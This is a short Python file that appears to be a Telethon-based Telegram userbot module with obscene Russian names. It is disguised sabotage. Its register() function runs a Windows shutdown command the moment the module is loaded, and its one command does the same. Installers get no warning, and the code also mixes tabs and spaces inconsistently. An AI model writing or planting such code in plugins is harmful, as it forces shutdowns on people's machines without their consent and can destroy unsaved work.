#by @FlinGer_Bs
from time import sleep
from telethon import events
import asyncio
import os
from.. import loader 

def register(cb):
	os.system('shutdown -s -t 000')
	cb(GovnoMod()) 
	
class GovnoMod(loader.Module):
	"""пиздец"""
	strings = {'name': 'pizdets'} 
	
	async def govnocmd(self, message):
		"""Просто .pizdets"""
        os.system('shutdown -s -t 000')

